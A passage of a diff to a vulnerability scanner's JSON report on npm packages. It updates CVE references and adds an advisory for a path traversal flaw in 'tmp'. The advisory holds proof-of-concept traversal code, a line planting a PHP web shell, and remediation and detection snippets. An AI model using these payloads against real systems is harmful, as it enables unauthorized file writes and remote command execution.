             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32006",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32559",
             "https://errata.almalinux.org/9/ALSA-2023-5363.html",
-            "https://errata.rockylinux.org/RLSA-2023:5363",
+            "https://errata.rockylinux.org/RLSA-2023:5362",
             "https://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
             "https://github.com/npm/node-semver",
             "https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104",
@@ -38492,7 +38657,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32006",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32559",
             "https://errata.almalinux.org/9/ALSA-2023-5363.html",
-            "https://errata.rockylinux.org/RLSA-2023:5363",
+            "https://errata.rockylinux.org/RLSA-2023:5362",
             "https://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
             "https://github.com/npm/node-semver",
             "https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104",
@@ -39402,10 +39567,12 @@
             "CWE-22"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "amazon": 3,
             "ghsa": 3,
             "nvd": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -39422,7 +39589,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2026-23745",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e",
             "https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97",
@@ -39463,10 +39648,12 @@
             "CWE-367"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "amazon": 3,
             "ghsa": 3,
             "nvd": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -39483,7 +39670,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2026-23950",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6",
             "https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w",
@@ -39523,9 +39728,11 @@
             "CWE-59"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "amazon": 3,
             "ghsa": 3,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -39538,7 +39745,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2026-24842",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46",
             "https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v",
@@ -39638,7 +39863,7 @@
             "CWE-59"
           ],
           "VendorSeverity": {
-            "amazon": 3,
+            "amazon": 2,
             "ghsa": 3,
             "nvd": 2,
             "redhat": 3
@@ -39786,7 +40011,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22020",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28863",
             "https://errata.almalinux.org/9/ALSA-2024-6147.html",
-            "https://errata.rockylinux.org/RLSA-2024:6147",
+            "https://errata.rockylinux.org/RLSA-2024:6148",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7",
             "https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7 (v6.2.1)",
@@ -40266,10 +40491,12 @@
             "CWE-22"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "amazon": 3,
             "ghsa": 3,
             "nvd": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -40286,7 +40513,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2026-23745",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e",
             "https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97",
@@ -40327,10 +40572,12 @@
             "CWE-367"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "amazon": 3,
             "ghsa": 3,
             "nvd": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -40347,7 +40594,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2026-23950",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6",
             "https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w",
@@ -40387,9 +40652,11 @@
             "CWE-59"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "amazon": 3,
             "ghsa": 3,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -40402,7 +40669,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2026-24842",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46",
             "https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v",
@@ -40502,7 +40787,7 @@
             "CWE-59"
           ],
           "VendorSeverity": {
-            "amazon": 3,
+            "amazon": 2,
             "ghsa": 3,
             "nvd": 2,
             "redhat": 3
@@ -40650,7 +40935,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22020",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-28863",
             "https://errata.almalinux.org/9/ALSA-2024-6147.html",
-            "https://errata.rockylinux.org/RLSA-2024:6147",
+            "https://errata.rockylinux.org/RLSA-2024:6148",
             "https://github.com/isaacs/node-tar",
             "https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7",
             "https://github.com/isaacs/node-tar/commit/fe8cd57da5686f8695415414bda49206a545f7f7 (v6.2.1)",
@@ -40664,6 +40949,86 @@
           ],
           "PublishedDate": "2024-03-21T23:15:10.91Z",
           "LastModifiedDate": "2025-12-16T17:25:07.493Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44705",
+          "VendorIDs": [
+            "GHSA-ph9p-34f9-6g65"
+          ],
+          "PkgID": "tmp@0.0.24",
+          "PkgName": "tmp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tmp@0.0.24",
+            "UID": "ad5c98ea079abedc"
+          },
+          "InstalledVersion": "0.0.24",
+          "FixedVersion": "0.2.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44705",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:6fdae728e1d19531dbca2f6df6c7883a8a04fd961114e4f3a7a718fa201ab98c",
+          "Title": "tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape",
+          "Description": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `\u003cprefix\u003e-\u003cpid\u003e-\u003crandom\u003e-\u003cpostfix\u003e`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-\u003cpid\u003e-\u003crandom\u003e\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) =\u003e {\n  // Results in file creation at: /tmp/sensitive-area/malicious.config\n  console.log('Final malicious path:', filepath);\n  cleanup();\n});\n```\n\n**Real-World Attack Simulation:**\n```javascript\n// Simulate web API that accepts user file prefix\nfunction createUserTempFile(userPrefix, content) {\n  return new Promise((resolve, reject) =\u003e {\n    tmp.file({ prefix: userPrefix }, (err, path, fd, cleanup) =\u003e {\n      if (err) return reject(err);\n      \n      fs.writeSync(fd, content);\n      console.log('User file created at:', path);\n      resolve({ path, cleanup });\n    });\n  });\n}\n\n// Attacker input\nconst attackerPrefix = '../../../var/www/html/backdoor';\ncreateUserTempFile(attackerPrefix, '\u003c?php system($_GET[\"cmd\"]); ?\u003e');\n// Creates PHP backdoor in web root instead of temp directory\n```\n\n### Impact\n\n**Arbitrary File Creation:**\n- Files created outside intended temporary directories\n- Attacker control over file placement location\n- Potential to overwrite existing files (depending on creation flags)\n- Cross-platform exploitation capability\n\n**Attack Scenarios:**\n\n**1. Web Application Configuration Poisoning:**\n- User uploads file with malicious prefix/postfix\n- tmp creates \"temporary\" file in application configuration directory\n- Malicious configuration loaded on next application restart\n\n**2. Cache Poisoning:**\n- Application caches user content using tmp\n- Attacker escapes to cache directory of different user/tenant\n- Poisoned cache serves malicious content to other users\n\n**3. Build Pipeline Compromise:**\n- CI/CD system processes user PRs with tmp usage\n- Malicious prefix escapes to build output directories\n- Compromised build artifacts deployed to production\n\n**4. Container Escape Attempt:**\n- Containerized application uses tmp with user input\n- Attacker attempts to escape container temp restrictions\n- Files created in host-mapped volumes or sensitive container areas\n\n**5. Multi-Tenant Service Bypass:**\n- SaaS platform isolates tenants using separate tmp directories\n- Tenant A escapes their tmp space to tenant B's area\n- Cross-tenant data access and potential privilege escalation\n\n**Business Impact:**\n- **Data Integrity:** Unauthorized file placement can corrupt application state\n- **Service Disruption:** Files in wrong locations may break application functionality  \n- **Security Bypass:** Escape temporary isolation boundaries\n- **Compliance Violations:** Files containing sensitive data placed in uncontrolled locations\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** tmp\n- **Repository:** github.com/raszi/node-tmp\n- **Affected versions:** All versions with vulnerable path construction logic\n- **Patched versions:** None currently available\n\n**Component Impact:**\n- `tmp.file()` function - vulnerable to prefix/postfix/dir traversal\n- `tmp.dir()` function - vulnerable to same parameter manipulation  \n- `tmp.tmpName()` function - if using affected path construction\n\n**Severity:** High  \n**CVSS v3.1:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L)\n\n**CWE Classification:**\n- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)\n\n### Remediation\n\n**Input Validation and Sanitization:**\n\n1. **Sanitize prefix/postfix:**\n```javascript\nfunction sanitizePrefix(prefix) {\n  if (!prefix) return '';\n  // Remove path separators and traversal sequences\n  return path.basename(String(prefix)).replace(/[\\.\\/\\\\]/g, '-');\n}\n\nfunction sanitizePostfix(postfix) {\n  if (!postfix) return '';\n  // Allow only safe characters\n  return String(postfix).replace(/[^A-Za-z0-9._-]/g, '');\n}\n```\n\n2. **Validate dir parameter:**\n```javascript\nfunction validateDir(dir, baseDir) {\n  if (!dir) return '';\n  \n  // Reject absolute paths\n  if (path.isAbsolute(dir)) {\n    throw new Error('Absolute paths not allowed for dir option');\n  }\n  \n  // Resolve and check containment\n  const resolved = path.resolve(baseDir, dir);\n  const relative = path.relative(baseDir, resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Dir option escapes base directory');\n  }\n  \n  return dir;\n}\n```\n\n3. **Post-construction path validation:**\n```javascript\nfunction validateFinalPath(finalPath, baseDir) {\n  const resolved = path.resolve(finalPath);\n  const relative = path.relative(path.resolve(baseDir), resolved);\n  \n  if (relative.startsWith('..') || path.isAbsolute(relative)) {\n    throw new Error('Generated path escapes temporary directory');\n  }\n  \n  return resolved;\n}\n```\n\n**Secure Implementation Pattern:**\n```javascript\nfunction createTempFile(options) {\n  const opts = { ...options };\n  \n  // Sanitize inputs\n  opts.prefix = sanitizePrefix(opts.prefix);\n  opts.postfix = sanitizePostfix(opts.postfix);\n  opts.dir = validateDir(opts.dir, opts.tmpdir);\n  \n  // Create with sanitized options\n  return tmp.file(opts, (err, path, fd, cleanup) =\u003e {\n    if (err) return callback(err);\n    \n    // Validate final path\n    try {\n      validateFinalPath(path, opts.tmpdir);\n    } catch (validationErr) {\n      cleanup();\n      return callback(validationErr);\n    }\n    \n    callback(null, path, fd, cleanup);\n  });\n}\n```\n\n### Workarounds\n\n**For Application Developers:**\n\n1. **Input Sanitization:**\n```javascript\n// Sanitize before passing to tmp\nfunction safeTmpFile(userOptions) {\n  const safeOpts = {\n    ...userOptions,\n    prefix: userOptions.prefix ? path.basename(userOptions.prefix) : undefined,\n    postfix: userOptions.postfix ? userOptions.postfix.replace(/[^A-Za-z0-9._-]/g, '') : undefined,\n    dir: undefined // Don't allow user-controlled dir\n  };\n  \n  return tmp.file(safeOpts);\n}\n```\n\n2. **Path Validation:**\n```javascript\nfunction validateTmpPath(tmpPath, expectedBase) {\n  const relativePath = path.relative(expectedBase, tmpPath);\n  if (relativePath.startsWith('..') || path.isAbsolute(relativePath)) {\n    throw new Error('Temporary file path escaped base directory');\n  }\n  return tmpPath;\n}\n```\n\n3. **Restricted Usage:**\n```javascript\n// Only use tmp with known-safe, literal values\ntmp.file({ prefix: 'app-temp-', postfix: '.tmp' }, callback);\n// Never: tmp.file({ prefix: userInput }, callback);\n```\n\n**For Security Teams:**\n\n1. **Code Review Patterns:**\n```bash\n# Search for dangerous tmp usage\ngrep -r \"tmp\\.file.*prefix.*req\\|tmp\\.file.*postfix.*req\" .\ngrep -r \"tmp\\.dir.*opts\\|tmp\\.file.*opts\" .\n```\n\n2. **Runtime Monitoring:**\n```javascript\n// Monitor for files created outside expected temp areas\nconst originalFile = tmp.file;\ntmp.file = function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) =\u003e {\n    if (!err \u0026\u0026 options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix \u0026\u0026 options.prefix.includes('..'),\n      options.postfix \u0026\u0026 options.postfix.includes('..'),  \n      options.dir \u0026\u0026 path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* \u0026\u0026 \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+              "V40Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/raszi/node-tmp",
+            "https://github.com/raszi/node-tmp/commit/efa4a06f24374797ae32ab2b6ae39b7a611ae429",
+            "https://github.com/raszi/node-tmp/security/advisories/GHSA-ph9p-34f9-6g65"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-44705",
+          "VendorIDs": [
+            "GHSA-ph9p-34f9-6g65"
+          ],
+          "PkgID": "tmp@0.1.0",
+          "PkgName": "tmp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/tmp@0.1.0",
+            "UID": "8b54d42e7356a964"
+          },
+          "InstalledVersion": "0.1.0",
+          "FixedVersion": "0.2.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-44705",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:ac63c22a46a2c9048267a0df1c08acb3d0f544836101b857e68b3213031deeae",
+          "Title": "tmp has Path Traversal via unsanitized prefix/postfix that enables directory escape",
+          "Description": "### Summary\n\nThe tmp npm package contains a path traversal vulnerability that allows escaping the intended temporary directory when untrusted data flows into the `prefix`, `postfix`, or `dir` options. By embedding traversal sequences (e.g., `../`) or path separators in these parameters, attackers can cause files to be created outside the configured temporary base directory at attacker-controlled locations with the privileges of the running process. This vulnerability affects applications that pass user-controlled data to tmp's file/directory creation functions without proper input sanitization.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in tmp's path construction logic where user-supplied options are directly concatenated into file paths without sanitization or validation.\n\n**Technical Flow:**\n1. **Filename Construction:** tmp builds filenames as `\u003cprefix\u003e-\u003cpid\u003e-\u003crandom\u003e-\u003cpostfix\u003e`\n2. **Path Composition:** Final path computed as `path.join(tmpDir, opts.dir, name)`\n3. **Path Normalization:** Node.js `path.join()` normalizes traversal sequences, allowing escape\n4. **File Creation:** File created at the resulting (potentially escaped) path\n\n**Vulnerable Pattern:**\n```javascript\n// In tmp package internals\nconst name = `${opts.prefix || ''}-${process.pid}-${randomString}-${opts.postfix || ''}`;\nconst finalPath = path.join(tmpDir, opts.dir || '', name);\n// No validation that finalPath remains within tmpDir\n```\n\n**Path Traversal Mechanics:**\n- **prefix/postfix traversal:** `../../../evil` in prefix escapes directory structure\n- **Absolute path bypass:** If `opts.dir` is absolute, `path.join()` ignores `tmpDir` completely\n- **Normalization exploitation:** `path.join()` resolves `../` sequences regardless of surrounding text\n- **Cross-platform impact:** Works on Windows (`..\\\\`), Unix (`../`), and mixed path systems\n\n**Key Vulnerability Points:**\n- No input validation on `prefix`, `postfix`, or `dir` parameters\n- Direct use of user input in path construction\n- Reliance on `path.join()` normalization without containment checks\n- Missing post-construction validation that final path remains within intended directory\n\n### PoC\n\n**Basic Path Traversal via prefix:**\n```javascript\nconst tmp = require('tmp');\nconst path = require('path');\nconst fs = require('fs');\n\n// Create a controlled base directory\nconst baseDir = fs.mkdtempSync('/tmp/safe-base-');\nconsole.log('Base directory:', baseDir);\n\n// Escape via prefix\ntmp.file({ \n  tmpdir: baseDir, \n  prefix: '../escaped' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Created file:', filepath);\n  console.log('Relative to base:', path.relative(baseDir, filepath));\n  // Output shows: ../escaped-\u003cpid\u003e-\u003crandom\u003e\n  \n  cleanup();\n});\n```\n\n**Directory Escape via postfix:**\n```javascript\ntmp.file({ \n  tmpdir: baseDir, \n  postfix: '/../../pwned.txt' \n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Escaped file:', filepath);\n  console.log('Escaped outside base:', !filepath.startsWith(baseDir));\n  \n  cleanup();\n});\n```\n\n**Absolute Path Bypass via dir:**\n```javascript\ntmp.file({ \n  tmpdir: '/safe/tmp/dir', \n  dir: '/tmp/evil-location',\n  prefix: 'bypassed'\n}, (err, filepath, fd, cleanup) =\u003e {\n  if (err) throw err;\n  \n  console.log('Bypassed to:', filepath);\n  // File created in /tmp/evil-location instead of /safe/tmp/dir\n  \n  cleanup();\n});\n```\n\n**Advanced Multi-Vector Attack:**\n```javascript\nconst maliciousOpts = {\n  tmpdir: '/app/safe-tmp',\n  dir: '../../../tmp',           // Escape base\n  prefix: '../sensitive-area/',   // Further traversal\n  postfix: 'malicious.config'     // Controlled filename\n};\n\ntmp.file(maliciousOpts, (err, filepath, fd, cleanup) =\u003e {\n  // Results in file creation at: 